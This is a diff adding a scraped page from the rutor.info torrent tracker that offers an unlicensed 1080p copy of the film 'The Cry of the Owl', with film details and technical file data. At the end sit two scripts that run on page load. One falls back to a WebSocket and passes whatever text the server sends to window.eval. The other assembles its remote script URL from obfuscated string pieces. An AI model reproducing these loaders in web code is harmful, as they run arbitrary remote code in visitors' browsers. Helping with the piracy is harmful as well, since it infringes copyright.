@@ -1,0 +1,446 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Крик Совы / The Cry of the Owl (2009)  BDRip 1080p | P2</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Крик Совы / The Cry of the Owl (2009)  BDRip 1080p | P2</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:e1ba44570af21d639836110843dccc26e910f68e&amp;dn=rutor.info_%D0%9A%D1%80%D0%B8%D0%BA+%D0%A1%D0%BE%D0%B2%D1%8B+%2F+The+Cry+of+the+Owl+%282009%29++BDRip+1080p+%7C+P2&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=395011"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/395011"><img src="http://s.rutor.info/t/down.png"> Скачать Cry.of.the.Owl.2009.1080p.DTSHD.x264-CHD.mkv.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://s019.radikal.ru/i607/1412/49/d8db7cdfd3b1.jpg" /> <a href="/tag/1/" target="_blank"></a><br />
+ <a href="/tag/1/" target="_blank"></a><br />
+<u>Информация о фильме</u> <a href="/tag/1/" target="_blank"></a><br />
+<b>Название: </b><i>Крик Совы</i> <a href="/tag/1/" target="_blank"></a><br />
+<b>Оригинальное название: </b><i>The Cry of the Owl</i> <a href="/tag/1/" target="_blank"></a><br />
+<b>Год выхода: </b><i>2009</i> <a href="/tag/1/" target="_blank"></a><br />
+<b>Жанр: </b><i>Триллер, драма</i> <a href="/tag/1/" target="_blank"></a><br />
+<b>Режиссер: </b><i><b>Джэйми Травес</b></i> <a href="/tag/1/" target="_blank"></a><br />
+<b>В ролях: </b><span style="color:blue;"><b>Пэдди Консидайн, Джулия Стайлз, Каролин Давернас, Горд Рэнд, Джеймс Гилберт, Арнольд Пиннок, Р.Д. Рейд, Брюс МакФи, Дженнифер Кидд, Питер МакНейл</b></span> <a href="/tag/1/" target="_blank"></a><br />
+ <a href="/tag/1/" target="_blank"></a><br />
+<b>О фильме:</b> <a href="/tag/1/" target="_blank"></a><br />
+<i><b>Фильм основан на повести Патрисии Хайсмит, она рассказывает о Роберте, парне, у которого было много проблем. Вместо того, чтоб их решить, он предпочитает наблюдать за незнакомой ему девушкой издалека, однако, заметив его за этим странным занятием, девушка не вызывает полицию, а впускает его к себе домой.</b></i> <a href="/tag/1/" target="_blank"></a><br />
+ <a href="/tag/1/" target="_blank"></a><br />
+ <a href="http://www.imdb.com/title/tt1034302/" target="_blank"><img src="http://s.rutor.info/imdb/pic/1034302.gif" /></a> <a href="http://www.kinopoisk.ru/film/397555/" target="_blank"><img src="http://www.kinopoisk.ru/rating/397555.gif" /></a><br />
+ <a href="/tag/1/" target="_blank"></a><br />
+<b>Страна: </b><b><i>Германия, Канада, Франция, Великобритания</i></b> <a href="/tag/1/" target="_blank"></a><br />
+<b>Студия: </b><span style="color:green;"><i><b>BBC Films, MACT Productions, Myriad Pictures</b></i></span> <a href="/tag/1/" target="_blank"></a><br />
+<b>Продолжительность: </b><i>01:39:39</i> <a href="/tag/1/" target="_blank"></a><br />
+<b>Перевод: </b><i>Профессиональный двухголосый (закадровый) <b>(R5)</b></i> <a href="/tag/1/" target="_blank"></a><br />
+ <a href="/tag/1/" target="_blank"></a><br />
+<u>Файл</u> <a href="/tag/1/" target="_blank"></a><br />
+<b>Кодек: </b><i>MPEG-4 AVC</i> <a href="/tag/1/" target="_blank"></a><br />
+<b>Качество: </b><i>1080p</i> <a href="/tag/1/" target="_blank"></a><br />
+<b>Видео: </b><i>MPEG-4 AVC, 9373 Кбит/с, 1920х816</i> <a href="/tag/1/" target="_blank"></a><br />
+<b>Звук: </b><i>Русский (АС3, 6 ch, 448 Кбит/с), английский (DTS, 6 ch, 1536 Кбит/с)</i> <a href="/tag/1/" target="_blank"></a><br />
+<b>Субтитры: </b><i>Русские, английские</i> <a href="/tag/1/" target="_blank"></a><br />
+ <a href="/tag/1/" target="_blank"></a><br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://radikal.ru/fp/04c618c68c7243eba2a016e6c4518da6" target="_blank"><img src="http://s018.radikal.ru/i528/1412/6a/6408d34649ebt.jpg" /></a>   <a href="http://radikal.ru/fp/245238f439c14fc9a6d717c9d6999340" target="_blank"><img src="http://s014.radikal.ru/i327/1412/cc/d91955f50e73t.jpg" /></a>   <a href="http://radikal.ru/fp/99a00774af0446e1848b0ac03dbe9b23" target="_blank"><img src="http://s018.radikal.ru/i502/1412/1e/b0a0ac01f55et.jpg" /></a>   <a href="http://radikal.ru/fp/7fb8d0b680da46068d9ccb6253cc67de" target="_blank"><img src="http://i051.radikal.ru/1412/28/6a4f299c891ct.jpg" /></a></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">MediaInfo</div><div class="hidebody"></div><textarea class="hidearea">General <a href="/tag/1/" target="_blank"></a><br />
+Unique ID                                : 245277912207777573526401529537058346731 (0xB886CEBDADDD32AA8F1DDB250BC896EB) <a href="/tag/1/" target="_blank"></a><br />
+Complete name                            : Крик Совы.2009.1080p..mkv <a href="/tag/1/" target="_blank"></a><br />
+Format                                   : Matroska <a href="/tag/1/" target="_blank"></a><br />
+Format version                           : Version 1 <a href="/tag/1/" target="_blank"></a><br />
+File size                                : 8.23 GiB <a href="/tag/1/" target="_blank"></a><br />
+Duration                                 : 1h 39mn <a href="/tag/1/" target="_blank"></a><br />
+Overall bit rate                         : 11.8 Mbps <a href="/tag/1/" target="_blank"></a><br />
+Encoded date                             : UTC 2009-10-24 10:50:09 <a href="/tag/1/" target="_blank"></a><br />
+Writing application                      : mkvmerge v2.3.0 (&#039;Freak U&#039;) built on Sep  8 2008 18:32:16 <a href="/tag/1/" target="_blank"></a><br />
+Writing library                          : libebml v0.7.7 + libmatroska v0.8.1 <a href="/tag/1/" target="_blank"></a><br />
+ <a href="/tag/1/" target="_blank"></a><br />
+Video <a href="/tag/1/" target="_blank"></a><br />
+ID                                       : 1 <a href="/tag/1/" target="_blank"></a><br />
+Format                                   : AVC <a href="/tag/1/" target="_blank"></a><br />
+Format/Info                              : Advanced Video Codec <a href="/tag/1/" target="_blank"></a><br />
+Format profile                           : High@L4.1 <a href="/tag/1/" target="_blank"></a><br />
+Format settings, CABAC                   : Yes <a href="/tag/1/" target="_blank"></a><br />
+Format settings, ReFrames                : 4 frames <a href="/tag/1/" target="_blank"></a><br />
+Codec ID                                 : V_MPEG4/ISO/AVC <a href="/tag/1/" target="_blank"></a><br />
+Duration                                 : 1h 39mn <a href="/tag/1/" target="_blank"></a><br />
+Bit rate                                 : 9 878 Kbps <a href="/tag/1/" target="_blank"></a><br />
+Width                                    : 1 920 pixels <a href="/tag/1/" target="_blank"></a><br />
+Height                                   : 816 pixels <a href="/tag/1/" target="_blank"></a><br />
+Display aspect ratio                     : 2.35:1 <a href="/tag/1/" target="_blank"></a><br />
+Frame rate mode                          : Constant <a href="/tag/1/" target="_blank"></a><br />
+Frame rate                               : 24.000 fps <a href="/tag/1/" target="_blank"></a><br />
+Color space                              : YUV <a href="/tag/1/" target="_blank"></a><br />
+Chroma subsampling                       : 4:2:0 <a href="/tag/1/" target="_blank"></a><br />
+Bit depth                                : 8 bits <a href="/tag/1/" target="_blank"></a><br />
+Scan type                                : Progressive <a href="/tag/1/" target="_blank"></a><br />
+Bits/(Pixel*Frame)                       : 0.263 <a href="/tag/1/" target="_blank"></a><br />
+Stream size                              : 6.71 GiB (81%) <a href="/tag/1/" target="_blank"></a><br />
+Title                                    : Cry.of.the.Owl.2009 <a href="/tag/1/" target="_blank"></a><br />
+Writing library                          : x264 core 67 r1153M 7b6ce6a <a href="/tag/1/" target="_blank"></a><br />
+Encoding settings                        : cabac=1 / ref=4 / deblock=1:-3:-3 / analyse=0x3:0x113 / me=umh / subme=9 / psy_rd=1.1:0.3 / mixed_ref=1 / me_range=26 / chroma_me=1 / trellis=1 / 8x8dct=1 / cqm=2 / deadzone=21,11 / chroma_qp_offset=-4 / threads=12 / nr=0 / decimate=1 / mbaff=0 / bframes=3 / b_pyramid=1 / b_adapt=1 / b_bias=0 / direct=3 / wpredb=1 / keyint=250 / keyint_min=25 / scenecut=40 / rc=2pass / bitrate=9878 / ratetol=1.0 / qcomp=0.60 / qpmin=10 / qpmax=51 / qpstep=4 / cplxblur=20.0 / qblur=0.5 / ip_ratio=1.40 / pb_ratio=1.30 / aq=1:1.00 <a href="/tag/1/" target="_blank"></a><br />
+Language                                 : English <a href="/tag/1/" target="_blank"></a><br />
+Default                                  : Yes <a href="/tag/1/" target="_blank"></a><br />
+Forced                                   : No <a href="/tag/1/" target="_blank"></a><br />
+ <a href="/tag/1/" target="_blank"></a><br />
+Audio #1 <a href="/tag/1/" target="_blank"></a><br />
+ID                                       : 2 <a href="/tag/1/" target="_blank"></a><br />
+Format                                   : DTS <a href="/tag/1/" target="_blank"></a><br />
+Format/Info                              : Digital Theater Systems <a href="/tag/1/" target="_blank"></a><br />
+Mode                                     : 16 <a href="/tag/1/" target="_blank"></a><br />
+Format settings, Endianness              : Big <a href="/tag/1/" target="_blank"></a><br />
+Codec ID                                 : A_DTS <a href="/tag/1/" target="_blank"></a><br />
+Duration                                 : 1h 39mn <a href="/tag/1/" target="_blank"></a><br />
+Bit rate mode                            : Constant <a href="/tag/1/" target="_blank"></a><br />
+Bit rate                                 : 1 509 Kbps <a href="/tag/1/" target="_blank"></a><br />
+Channel(s)                               : 6 channels <a href="/tag/1/" target="_blank"></a><br />
+Channel positions                        : Front: L C R, Side: L R, LFE <a href="/tag/1/" target="_blank"></a><br />
+Sampling rate                            : 48.0 KHz <a href="/tag/1/" target="_blank"></a><br />
+Bit depth                                : 24 bits <a href="/tag/1/" target="_blank"></a><br />
+Compression mode                         : Lossy <a href="/tag/1/" target="_blank"></a><br />
+Stream size                              : 1.05 GiB (13%) <a href="/tag/1/" target="_blank"></a><br />
+Title                                    : DTS-HDMA core 1536k <a href="/tag/1/" target="_blank"></a><br />
+Language                                 : English <a href="/tag/1/" target="_blank"></a><br />
+Default                                  : Yes <a href="/tag/1/" target="_blank"></a><br />
+Forced                                   : No <a href="/tag/1/" target="_blank"></a><br />
+ <a href="/tag/1/" target="_blank"></a><br />
+Audio #2 <a href="/tag/1/" target="_blank"></a><br />
+ID                                       : 3 <a href="/tag/1/" target="_blank"></a><br />
+Format                                   : AC-3 <a href="/tag/1/" target="_blank"></a><br />
+Format/Info                              : Audio Coding 3 <a href="/tag/1/" target="_blank"></a><br />
+Mode extension                           : CM (complete main) <a href="/tag/1/" target="_blank"></a><br />
+Format settings, Endianness              : Big <a href="/tag/1/" target="_blank"></a><br />
+Codec ID                                 : A_AC3 <a href="/tag/1/" target="_blank"></a><br />
+Duration                                 : 1h 39mn <a href="/tag/1/" target="_blank"></a><br />
+Bit rate mode                            : Constant <a href="/tag/1/" target="_blank"></a><br />
+Bit rate                                 : 448 Kbps <a href="/tag/1/" target="_blank"></a><br />
+Channel(s)                               : 6 channels <a href="/tag/1/" target="_blank"></a><br />
+Channel positions                        : Front: L C R, Side: L R, LFE <a href="/tag/1/" target="_blank"></a><br />
+Sampling rate                            : 48.0 KHz <a href="/tag/1/" target="_blank"></a><br />
+Bit depth                                : 16 bits <a href="/tag/1/" target="_blank"></a><br />
+Compression mode                         : Lossy <a href="/tag/1/" target="_blank"></a><br />
+Stream size                              : 319 MiB (4%) <a href="/tag/1/" target="_blank"></a><br />
+Default                                  : No <a href="/tag/1/" target="_blank"></a><br />
+Forced                                   : No <a href="/tag/1/" target="_blank"></a><br />
+ <a href="/tag/1/" target="_blank"></a><br />
+Text #1 <a href="/tag/1/" target="_blank"></a><br />
+ID                                       : 4 <a href="/tag/1/" target="_blank"></a><br />
+Format                                   : UTF-8 <a href="/tag/1/" target="_blank"></a><br />
+Codec ID                                 : S_TEXT/UTF8 <a href="/tag/1/" target="_blank"></a><br />
+Codec ID/Info                            : UTF-8 Plain Text <a href="/tag/1/" target="_blank"></a><br />
+Default                                  : Yes <a href="/tag/1/" target="_blank"></a><br />
+Forced                                   : No <a href="/tag/1/" target="_blank"></a><br />
+ <a href="/tag/1/" target="_blank"></a><br />
+Text #2 <a href="/tag/1/" target="_blank"></a><br />
+ID                                       : 5 <a href="/tag/1/" target="_blank"></a><br />
+Format                                   : UTF-8 <a href="/tag/1/" target="_blank"></a><br />
+Codec ID                                 : S_TEXT/UTF8 <a href="/tag/1/" target="_blank"></a><br />
+Codec ID/Info                            : UTF-8 Plain Text <a href="/tag/1/" target="_blank"></a><br />
+Default                                  : No <a href="/tag/1/" target="_blank"></a><br />
+Forced                                   : No</textarea></div></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/1199435/0" target="_blank">Sifrady</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/kino" target="_blank">Зарубежные фильмы</a></td></tr>
+<tr><td class="header">Раздают</td><td>4</td></tr>
+<tr><td class="header">Качают</td><td>2</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 7:19:05 (40 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 19:54:31  (12 часа назад)</td></tr>
+<tr><td class="header">Размер</td><td>8.23&nbsp;GB  (8840224294 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 395011);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>04&nbsp;Дек&nbsp;13</td><td ><a class="downgif" href="http://d.rutor.info/download/320957"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:1d848b09c7edbe9cda68b3e4caee6dd69f1059ab&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/320957/krik-sovy_the-cry-of-the-owl-2009-hdrip-avc-p2">Крик Совы / The Cry of the Owl (2009) HDRip-AVC | P2 </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">2.18&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>15&nbsp;Дек&nbsp;12</td><td ><a class="downgif" href="http://d.rutor.info/download/241231"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:72e339cd4b8ae81908aacb9e3dc9f4783fc53eeb&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/241231/krik-sovy_the-cry-of-the-owl-2009-hdrip-avc">Крик совы / The Cry of the Owl (2009) HDRip-AVC </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.44&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>01&nbsp;Июн&nbsp;10</td><td ><a class="downgif" href="http://d.rutor.info/download/49211"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:edace7f0319d0d9cd4e7a1b819d03b6c812da110&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/49211/krik-sovy_the-cry-of-the-owl-2009-bdrip-ot-hq-video-licenzija">Крик совы / The Cry of the Owl (2009) BDRip от HQ-ViDEO | Лицензия </a></td> <td align="right">4<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.77&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/1/0/0/Cry of the Owl" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/395011.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (1)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=395011">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(395011);">Промодерировать раздачу</span> | <span onclick="confirm_delete(395011);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/395011">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
